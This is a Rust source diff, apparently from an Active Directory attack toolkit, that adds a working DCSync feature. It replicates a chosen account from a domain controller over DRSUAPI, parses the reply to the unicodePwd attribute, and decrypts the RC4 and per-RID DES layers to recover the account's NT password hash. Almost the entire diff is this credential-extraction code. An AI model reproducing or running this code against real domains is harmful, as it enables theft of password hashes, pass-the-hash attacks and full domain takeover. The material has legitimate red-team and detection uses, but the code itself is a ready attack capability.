@@ -11,7 +11,6 @@
 use crate::ndr::{NdrDecoder, NdrEncoder};
 use crate::transport::RpcTcp;
 use crate::{epm, Result, RpcError, Syntax};
-use adhammer_core::sid::Sid;
 use adhammer_core::Guid;
 
 /// DRSUAPI interface: e3514235-4b06-11d1-ab04-00c04fc2dcd2 v4.0.
@@ -63,6 +62,7 @@ fn drs_extensions_rgb() -> Vec<u8> {
 pub struct DrsSession {
     rpc: RpcTcp,
     handle: [u8; 20],
+    session_key: [u8; 16],
 }
 
 impl DrsSession {
@@ -107,7 +107,8 @@ impl DrsSession {
         if retval != 0 {
             return Err(RpcError::Protocol(format!("DRSBind failed: 0x{retval:08x}")));
         }
-        Ok(DrsSession { rpc, handle })
+        let session_key = rpc.session_key().ok_or_else(|| RpcError::Protocol("no session key".into()))?;
+        Ok(DrsSession { rpc, handle, session_key })
     }
 
     pub fn handle(&self) -> &[u8; 20] {
@@ -205,12 +206,207 @@ impl DrsSession {
         }
 
         let resp = self.rpc.call_sealed(opnum::DRS_GET_NC_CHANGES, &e.into_bytes()).await?;
-        if std::env::var("ADH_DEBUG").is_ok() {
-            std::fs::write("getncchanges.bin", &resp).ok();
-            eprintln!("[dbg] DRSGetNCChanges reply {} bytes → getncchanges.bin", resp.len());
-        }
         Ok(resp)
     }
+
+    /// Full single-object DCSync: crack the name to a GUID, replicate the object, and decrypt
+    /// its NT hash. Returns (rid, nt_hash).
+    pub async fn dcsync(&mut self, netbios_domain: &str, name: &str) -> Result<(u32, [u8; 16])> {
+        let guid = self.crack_name_to_guid(netbios_domain, name).await?;
+        let reply = self.get_nc_changes(&guid).await?;
+        let (rid, nt_enc) = parse_repl_object(&reply)?;
+        if nt_enc.is_empty() {
+            return Err(RpcError::Protocol("object has no unicodePwd (machine/empty?)".into()));
+        }
+        let nt = drs_decrypt_hash(&self.session_key, &nt_enc, rid)?;
+        Ok((rid, nt))
+    }
+}
+
+// DRS ATTRTYP for unicodePwd (the RC4/DES-wrapped NT hash).
+const ATTR_UNICODE_PWD: u32 = 0x0009_005a;
+
+/// Walk the DRS_MSG_GETCHGREPLY_V6 to the single replicated object; return (rid, encrypted
+/// unicodePwd). Parses only as far as the unicodePwd attribute value.
+fn parse_repl_object(reply: &[u8]) -> Result<(u32, Vec<u8>)> {
+    let mut d = NdrDecoder::new(reply);
+    // --- V6 fixed part ---
+    d.u32()?; d.u32()?; // pdwOutVersion, union switch
+    d.read_bytes(16)?; d.read_bytes(16)?; // uuidDsaObjSrc, uuidInvocIdSrc
+    d.u32()?; // pNC ref
+    d.align(8); d.read_bytes(24)?; d.read_bytes(24)?; // usnvecFrom, usnvecTo
+    d.u32()?; // pUpToDateVecSrc ref
+    let pfx_count = d.u32()?; d.u32()?; // PrefixTableSrc { count, ptr }
+    d.u32()?; d.u32()?; d.u32()?; // ulExtendedRet, cNumObjects, cNumBytes
+    d.u32()?; // pObjects ref
+    d.u32()?; // fMoreData
+    d.u32()?; d.u32()?; d.u32()?; d.u32()?; d.u32()?; // cNumNcSizeObjects/Values, cNumValues, rgValues, dwDRSError
+
+    // --- deferred: pNC DSNAME ---
+    skip_dsname(&mut d)?;
+    // --- deferred: prefix table (count entries, then each OID's byte array) ---
+    let ptmc = d.u32()?;
+    let mut oid_lens = Vec::with_capacity(ptmc as usize);
+    for _ in 0..ptmc {
+        d.u32()?; // ndx
+        oid_lens.push(d.u32()?); // OID length
+        d.u32()?; // OID elements ptr
+    }
+    for l in oid_lens {
+        if l > 0 {
+            let m = d.u32()?;
+            d.read_bytes(m as usize)?;
+            d.align(4);
+        }
+    }
+    let _ = pfx_count;
+
+    // --- deferred: pObjects (REPLENTINFLIST) ---
+    d.u32()?; // pNextEntInf ref
+    d.u32()?; // ENTINF.pName ref
+    d.u32()?; // ENTINF.ulFlags
+    let attr_count = d.u32()?; // ATTRBLOCK.attrCount
+    d.u32()?; // pAttr ref
+    d.u32()?; // fIsNCPrefix
+    d.u32()?; // pParentGuid ref
+    d.u32()?; // pMetaDataExt ref
+
+    // deferred within REPLENTINFLIST: pName DSNAME (carries the object SID → RID)
+    let rid = read_dsname_rid(&mut d)?;
+
+    // ATTR array (conformant): max_count then attr_count × (attrTyp, valCount, pAVal ref)
+    let amc = d.u32()?;
+    let mut triples = Vec::with_capacity(amc as usize);
+    for _ in 0..amc {
+        let at = d.u32()?;
+        let vc = d.u32()?;
+        let pav = d.u32()?;
+        triples.push((at, vc, pav));
+    }
+    let _ = attr_count;
+
+    // Per-attribute values (deferred, in attribute order). Stop once unicodePwd is captured.
+    for (at, vc, pav) in triples {
+        if pav == 0 || vc == 0 {
+            continue;
+        }
+        let vmc = d.u32()?;
+        let mut vptrs = Vec::with_capacity(vmc as usize);
+        for _ in 0..vmc {
+            d.u32()?; // valLen
+            vptrs.push(d.u32()?); // pVal ref
+        }
+        let mut first = Vec::new();
+        for (i, pv) in vptrs.iter().enumerate() {
+            if *pv != 0 {
+                let m = d.u32()?;
+                let b = d.read_bytes(m as usize)?.to_vec();
+                d.align(4);
+                if i == 0 {
+                    first = b;
+                }
+            }
+        }
+        if at == ATTR_UNICODE_PWD {
+            return Ok((rid, first));
+        }
+    }
+    Ok((rid, Vec::new()))
+}
+
+/// Consume a DSNAME (conformant struct); discard it.
+fn skip_dsname(d: &mut NdrDecoder) -> Result<()> {
+    let mc = d.u32()?; // StringName max_count
+    d.u32()?; // structLen
+    d.u32()?; // SidLen
+    d.read_bytes(16)?; // Guid
+    d.read_bytes(28)?; // Sid
+    d.u32()?; // NameLen
+    d.read_bytes(mc as usize * 2)?; // StringName
+    d.align(4);
+    Ok(())
+}
+
+/// Consume a DSNAME and return the RID from its embedded SID (last sub-authority).
+fn read_dsname_rid(d: &mut NdrDecoder) -> Result<u32> {
+    let mc = d.u32()?;
+    d.u32()?; // structLen
+    let sid_len = d.u32()?;
+    d.read_bytes(16)?; // Guid
+    let sid = d.read_bytes(28)?.to_vec();
+    d.u32()?; // NameLen
+    d.read_bytes(mc as usize * 2)?;
+    d.align(4);
+    if sid_len >= 8 {
+        let count = sid[1] as usize;
+        let off = 2 + 6 + (count - 1) * 4;
+        return Ok(u32::from_le_bytes(sid[off..off + 4].try_into().unwrap()));
+    }
+    Err(RpcError::Protocol("object DSNAME has no SID".into()))
+}
+
+// -------------------------------------------------------------------------------------------
+// DRS secret decryption (MS-DRSR 5.16.4): session-key MD5/RC4 unwrap, then per-RID DES.
+// -------------------------------------------------------------------------------------------
+
+fn drs_decrypt_hash(session_key: &[u8; 16], enc: &[u8], rid: u32) -> Result<[u8; 16]> {
+    use md5::{Digest, Md5};
+    if enc.len() < 20 {
+        return Err(RpcError::Protocol("encrypted value too short".into()));
+    }
+    // Outer layer: RC4 keyed by MD5(sessionKey || salt); salt is the first 16 bytes.
+    let salt = &enc[0..16];
+    let mut md5 = Md5::new();
+    md5.update(session_key);
+    md5.update(salt);
+    let rc4key = md5.finalize();
+    let plain = adhammer_ntlm::Rc4::new(&rc4key).apply(&enc[16..]); // CRC32(4) + wrapped(16)
+    if plain.len() < 20 {
+        return Err(RpcError::Protocol("decrypted value too short".into()));
+    }
+    Ok(remove_des_layer(&plain[4..20], rid))
+}
+
+/// Undo the per-RID DES layer that wraps the stored NT hash.
+fn remove_des_layer(data: &[u8], rid: u32) -> [u8; 16] {
+    use des::cipher::generic_array::GenericArray;
+    use des::cipher::{BlockDecrypt, KeyInit};
+    use des::Des;
+    let (k1, k2) = rid_to_des_keys(rid);
+    let mut out = [0u8; 16];
+    let c1 = Des::new(GenericArray::from_slice(&k1));
+    let mut b0 = *GenericArray::from_slice(&data[0..8]);
+    c1.decrypt_block(&mut b0);
+    let c2 = Des::new(GenericArray::from_slice(&k2));
+    let mut b1 = *GenericArray::from_slice(&data[8..16]);
+    c2.decrypt_block(&mut b1);
+    out[0..8].copy_from_slice(&b0);
+    out[8..16].copy_from_slice(&b1);
+    out
+}
+
+fn rid_to_des_keys(rid: u32) -> ([u8; 8], [u8; 8]) {
+    let r = rid.to_le_bytes();
+    let k1 = [r[0], r[1], r[2], r[3], r[0], r[1], r[2]];
+    let k2 = [r[3], r[0], r[1], r[2], r[3], r[0], r[1]];
+    (str_to_des_key(&k1), str_to_des_key(&k2))
+}
+
+/// Expand 7 key bytes into an 8-byte DES key (7 bits/byte, parity bit cleared).
+fn str_to_des_key(s: &[u8; 7]) -> [u8; 8] {
+    let mut k = [0u8; 8];
+    k[0] = s[0] >> 1;
+    k[1] = ((s[0] & 0x01) << 6) | (s[1] >> 2);
+    k[2] = ((s[1] & 0x03) << 5) | (s[2] >> 3);
+    k[3] = ((s[2] & 0x07) << 4) | (s[3] >> 4);
+    k[4] = ((s[3] & 0x0f) << 3) | (s[4] >> 5);
+    k[5] = ((s[4] & 0x1f) << 2) | (s[5] >> 6);
+    k[6] = ((s[5] & 0x3f) << 1) | (s[6] >> 7);
+    k[7] = s[6] & 0x7f;
+    for b in k.iter_mut() {
+        *b <<= 1;
+    }
+    k
 }
 
 #[cfg(test)]
